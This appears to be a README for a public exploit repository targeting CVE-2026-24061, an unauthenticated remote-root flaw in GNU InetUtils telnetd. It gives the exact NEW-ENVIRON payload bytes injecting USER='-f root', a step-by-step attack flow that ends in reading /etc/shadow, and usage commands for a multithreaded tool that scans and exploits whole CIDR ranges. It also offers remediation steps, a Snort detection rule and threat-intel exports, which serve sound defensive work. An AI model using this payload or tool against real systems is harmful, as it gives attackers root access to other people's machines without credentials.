<p align="center">
  <img src="https://img.shields.io/badge/CVE--2026--24061-Critical%20(9.8)-c0392b?style=flat" alt="CVE Score">
  <img src="https://img.shields.io/badge/License-AGPL--3.0-blue.svg" alt="License">
  <img src="https://img.shields.io/badge/Python-3-blue.svg" alt="Python">
  <img src="https://img.shields.io/badge/Dependencies-None-green.svg" alt="No deps">
</p>

<div align="center">
  <p>
    <strong>GNU InetUtils telnetd - Unauthenticated Remote Root via NEW-ENVIRON Variable Injection</strong>
  </p>
  <p>
    <a href="#vulnerability-overview">Overview</a> -
    <a href="#technical-analysis">Technical Analysis</a> -
    <a href="#affected-versions">Affected Versions</a> -
    <a href="#usage">Usage</a> -
    <a href="#remediation-and-mitigation">Remediation</a> -
    <a href="#references">References</a>
  </p>
</div>

<br>

## Vulnerability Overview

**CVE-2026-24061** is a critical authentication bypass vulnerability in the `telnetd` daemon distributed as part of **GNU InetUtils**. The flaw resides in the handling of the Telnet `NEW-ENVIRON` option ([RFC 1572](https://datatracker.ietf.org/doc/html/rfc1572)) during the initial protocol handshake.

The root cause is a failure to sanitize client-supplied environment variables before passing them to the `login(1)` program. When the Telnet daemon receives a `NEW-ENVIRON IS` sub-negotiation packet containing the variable `USER` with the value `-f root`, it passes this unsanitized value directly to the system `login` binary.

On systems where `login` accepts the `-f` flag (force login without password verification), this results in an unauthenticated root session being granted to the remote attacker.

This vulnerability class has historical precedent: CVE-2001-0797 in SysV telnetd and the well-known Linux telnetd `-f` bypass from 1994 exploited the same fundamental failure to sanitize environment-sourced arguments passed to privileged binaries.

**No credentials required. No prior access needed. A single network packet sequence achieves root.**

## Technical Analysis

### Root Cause

GNU InetUtils `telnetd` processes `NEW-ENVIRON` (option code `0x27`, per RFC 1572) sub-negotiation to collect client-supplied environment variables. These variables are assembled into an argument vector and passed to `execve(2)` when spawning `login(1)`.

The vulnerability is triggered as follows:

1. The server sends `IAC DO NEW-ENVIRON`, soliciting environment variables from the client.
2. The malicious client replies with `IAC WILL NEW-ENVIRON`.
3. The server follows with `IAC SB NEW-ENVIRON SEND IAC SE`.
4. The client sends the injected payload:

```
IAC SB NEW-ENVIRON IS
  VAR "USER" VALUE "-f root"
IAC SE
```

5. `telnetd` constructs the `login` invocation as `login -f root`.
6. `login(1)` interprets `-f` as "force login, skip authentication" and logs in the specified user (`root`) without requiring a password.

### Protocol-Level Breakdown

| Step | Direction | Telnet Bytes (hex) | Meaning |
|------|-----------|--------------------|---------|
| 1 | S -> C | `FF FD 27` | IAC DO NEW-ENVIRON |
| 2 | C -> S | `FF FB 27` | IAC WILL NEW-ENVIRON |
| 3 | S -> C | `FF FA 27 01 FF F0` | IAC SB NEW-ENVIRON SEND IAC SE |
| 4 | C -> S | `FF FA 27 00 00 55 53 45 52 01 2D 66 20 72 6F 6F 74 FF F0` | IAC SB NEW-ENVIRON IS VAR "USER" VALUE "-f root" IAC SE |

### Why `-f root` Works

The `login(1)` binary on many Linux systems accepts the `-f <user>` flag for "pre-authenticated" logins, historically used by terminal multiplexers and `rlogin`. When `telnetd` builds its `exec` call and fails to strip leading hyphens or validate option-like strings in environment variable values, it inadvertently passes attacker-controlled flags directly to `login`.

The effective call becomes:

```c
execve("/bin/login", ["login", "-f", "root"], envp);
```

### Attack Scenario

```
Attacker                                    Vulnerable telnetd (port 23)
   |                                                   |
   |------- TCP SYN (port 23) ----------------------->|
   |<------ TCP SYN-ACK -------------------------------|
   |------- TCP ACK ---------------------------------->|
   |                                                   |
   |<------ Telnet banner + IAC DO NEW-ENVIRON --------|
   |------- IAC WILL NEW-ENVIRON --------------------->|
   |<------ IAC SB NEW-ENVIRON SEND IAC SE ------------|
   |                                                   |
   |------- IAC SB NEW-ENVIRON IS                      |
   |        VAR "USER" VALUE "-f root" IAC SE -------->|
   |                                                   |
   |        [telnetd calls: login -f root]             |
   |                                                   |
   |<------ Root shell prompt (#) ---------------------|
   |                                                   |
   |------- id; whoami; cat /etc/shadow -------------->|
   |<------ uid=0(root) root /etc/shadow contents -----|
```

**Prerequisites:**
- Target system running GNU InetUtils `telnetd` (TCP/23 open)
- Unpatched version of `inetutils`
- `login(1)` binary supports the `-f` flag (standard on most Linux distributions)
- No firewall blocking TCP/23

## Affected Versions

| Software | Affected Versions | Status |
|----------|-------------------|--------|
| GNU InetUtils telnetd | <= 2.x (specific patched version TBD) | Vulnerable |
| Distributions shipping unpatched GNU inetutils | Various | Check vendor advisory |

> Verify whether your distribution ships a patched version. Many modern systems have Telnet disabled by default; exposure requires an explicitly running `telnetd`.

## CVSS Score

| Metric | Value |
|--------|-------|
| **CVSS v3.1 Base Score** | **9.8 (Critical)** |
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality Impact | High |
| Integrity Impact | High |
| Availability Impact | High |
| **Vector String** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

## MITRE ATT&CK Mapping

| ATT&CK ID | Tactic | Technique | Relevance |
|-----------|--------|-----------|-----------|
| [T1190](https://attack.mitre.org/techniques/T1190/) | Initial Access | Exploit Public-Facing Application | Direct exploitation of telnetd over the network |
| [T1059](https://attack.mitre.org/techniques/T1059/) | Execution | Command and Scripting Interpreter | Shell execution post-exploitation |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Privilege Escalation / Defense Evasion | Valid Accounts: Local Accounts | Authentication bypass yields a valid root session |
| [T1548](https://attack.mitre.org/techniques/T1548/) | Privilege Escalation | Abuse Elevation Control Mechanism | `login -f` flag abused to bypass PAM/authentication |
| [T1046](https://attack.mitre.org/techniques/T1046/) | Discovery | Network Service Discovery | Mass scanning component of the PoC |

## Installation

**Requirements:** Python 3 (standard library only, zero external dependencies).

```bash
git clone https://github.com/franckferman/CVE_2026_24061.git
cd CVE_2026_24061
```

No `pip install` needed. Both scripts use only the Python standard library.

## Project Structure

```
poc_cve_2026_24061.py       # Simple PoC (~100 lines) - understand the vulnerability
cve_2026_24061.py           # Industrialized exploit - multithreaded, CIDR, CSV/JSON export
scripts/
  generate_signatures.py    # Auto-generate Snort/Suricata + Sigma rules from payload
  generate_misp_event.py    # Generate MISP-importable event JSON
  generate_stix_bundle.py   # Generate STIX 2.1 bundle (MISP, OpenCTI, TAXII)
signatures/
  snort.rules               # Snort/Suricata detection rules (auto-generated)
  sigma.yml                 # Sigma rule for SIEM (auto-generated)
indicators/
  misp_event.json           # MISP event - import via Events > Add Event > Import
  stix_bundle.json          # STIX 2.1 bundle - 11 objects (vuln, indicator, ATT&CK, CoA)
```

- **`poc_cve_2026_24061.py`**: Minimal, readable, educational. One target, one function, zero abstraction. Read this to understand exactly how the vulnerability works at the protocol level.
- **`cve_2026_24061.py`**: Industrialized exploit for pentesting engagements. Multithreaded, supports CIDR ranges, file input, CSV/JSON export, quiet mode, custom users.

## Usage

### Simple PoC (poc_cve_2026_24061.py)

Exploit a single host. The code is deliberately minimal so you can read it top to bottom and understand the full attack chain.

```bash
# Basic usage
python3 poc_cve_2026_24061.py 192.168.1.100

# Custom port
python3 poc_cve_2026_24061.py 10.0.0.5 2323
```

### Industrialized Exploit (cve_2026_24061.py)

#### Single Host

```bash
python3 cve_2026_24061.py -t 192.168.1.100
```

#### CIDR Range (Mass Scan)

```bash
python3 cve_2026_24061.py -t 10.0.0.0/24 -T 50
```

#### File Input

```bash
python3 cve_2026_24061.py -f targets.txt -o results.csv
```

### JSON Export

```bash
python3 cve_2026_24061.py -t 10.0.0.0/24 --json results.json
```

### Custom Target User

```bash
python3 cve_2026_24061.py -t 192.168.1.1 --user admin
```

### Quiet Mode (pipe-friendly)

```bash
python3 cve_2026_24061.py -t 10.0.0.0/24 -q | tee vulnerable.txt
```

### Full Options

| Parameter | Default | Description |
|---|---|---|
| `-t / --target` | - | Single IP, hostname, or CIDR range |
| `-f / --file` | - | File containing IPs/CIDRs (one per line, `#` comments) |
| `-T / --threads` | `10` | Number of concurrent threads |
| `-p / --port` | `23` | Target Telnet port |
| `--timeout` | `5` | Socket timeout in seconds |
| `--user` | `root` | Username for the `-f` payload |
| `-o / --output` | - | Export results to CSV file |
| `--json` | - | Export results to JSON file |
| `-q / --quiet` | off | Quiet mode: only print vulnerable targets (one per line) |
| `--no-color` | off | Disable ANSI color output |

### Output Statuses

| Status | Meaning |
|--------|---------|
| `[VULN]` | Host confirmed vulnerable - root shell obtained |
| `[SAFE]` | Host responded but authentication was not bypassed |
| `[CLOS]` | Port closed or connection refused |
| `[ERR ]` | Socket or protocol error during scan |

CSV output columns: `ip:port, status, message`

## PoC Behavior

The script implements the full Telnet `NEW-ENVIRON` negotiation state machine natively in Python without relying on external Telnet libraries:

1. Opens a raw TCP socket to the target on port 23 (configurable).
2. Reads incoming `IAC` command sequences and responds to `DO NEW-ENVIRON` with `WILL NEW-ENVIRON`.
3. Upon receiving the server `SB NEW-ENVIRON SEND` sub-negotiation, transmits the injected payload (`USER = "-f root"`).
4. Monitors the response buffer for indicators of successful root login: presence of `uid=0(root)` or a shell prompt (`#`), in the absence of `Login incorrect` or `Password:`.
5. If the payload was injected, sends `id\n` and checks for `uid=0(root)` in the response as secondary confirmation.

Results are logged to stdout with color-coded status labels. Optional CSV export records all findings for post-processing.

## Remediation and Mitigation

### Immediate Actions

1. **Disable Telnet entirely.** Telnet transmits all data in cleartext. Replace with SSH.

   ```bash
   sudo systemctl disable telnet.socket --now
   sudo systemctl disable inetd --now
   ```

2. **Apply vendor patch.** Install the patched version of `inetutils` from your distribution once available.

3. **Block TCP/23 at perimeter.** Apply firewall rules to deny inbound Telnet connections.

   ```bash
   # iptables
   sudo iptables -A INPUT -p tcp --dport 23 -j DROP
   # nftables
   sudo nft add rule inet filter input tcp dport 23 drop
   ```

### Defense in Depth

| Control | Description |
|---------|-------------|
| Network segmentation | Restrict Telnet to isolated management networks if it cannot be disabled |
| PAM hardening | Review PAM configuration; disable `-f` pre-authentication where not required by `login.defs` |
| IDS/IPS signatures | Detect `NEW-ENVIRON IS VAR USER VALUE -f` patterns in Telnet traffic |
| Audit logging | Monitor `auth.log` / `secure` for unexpected root logins via `login` |
| Vulnerability scanning | Run authenticated scans (OpenVAS, Nessus) to identify unpatched `inetutils` |

### Detection (SIEM/IDS)

Snort/Suricata rule skeleton for detecting the exploit in transit:

```
alert tcp any any -> any 23 (
  msg:"CVE-2026-24061 telnetd USER=-f root exploit attempt";
  content:"|FF FA 27 00 00|USER|01|-f root|FF F0|";
  sid:2026240610; rev:1;
)
```

## Threat Intelligence

This repository ships pre-generated threat intel artifacts, ready to import into your SOC/CTI stack. They are auto-generated by CI from the actual exploit payload - if the payload changes, the artifacts update.

### MISP

Import `indicators/misp_event.json` directly into any MISP instance:

```
Events > Add Event > Import from... > JSON
```

The event contains: CVE ID, CVSS vector, Snort signature, payload hex, MITRE ATT&CK tags (T1190, T1548, T1059), CPE, and external references.

### STIX 2.1

Import `indicators/stix_bundle.json` into OpenCTI, TAXII servers, or any STIX 2.1 consumer.

The bundle contains 11 objects: Vulnerability, Indicator (network pattern), 3 Attack Patterns (MITRE), Course of Action (remediation), Identity, and Relationships linking them.

### IDS Signatures

Pre-built rules in `signatures/`:

- `snort.rules` - 3 Snort/Suricata rules (exploit attempt, generic -f injection, post-exploitation root shell)
- `sigma.yml` - Sigma rule for SIEM correlation

### Regenerate

If you modify the exploit payload, regenerate all artifacts:

```bash
python3 scripts/generate_signatures.py
python3 scripts/generate_misp_event.py
python3 scripts/generate_stix_bundle.py
```

References: [MISP](https://www.misp-project.org/) - [OpenCTI](https://www.opencti.io/) - [STIX 2.1](https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html) - [Sigma](https://sigmahq.io/)

## References

- [GNU InetUtils Official Repository](https://git.savannah.gnu.org/cgit/inetutils.git)
- [RFC 1572 - Telnet Environment Option (NEW-ENVIRON)](https://datatracker.ietf.org/doc/html/rfc1572)
- [RFC 854 - Telnet Protocol Specification](https://datatracker.ietf.org/doc/html/rfc854)
- [CVE-2001-0797 - Historical SysV telnetd -f bypass (precedent)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0797)
- [MITRE ATT&CK - T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK - T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
- [MISP Project](https://www.misp-project.org/)
- [Linux login(1) man page](https://man7.org/linux/man-pages/man1/login.1.html)

## Legal Disclaimer

This tool is provided for **authorized security auditing, academic research, and educational purposes only**. Usage against systems without explicit written permission from the system owner is illegal under applicable computer fraud and abuse laws (including but not limited to the CFAA, Computer Misuse Act, and equivalent legislation). The author accepts no liability for unauthorized or malicious use.
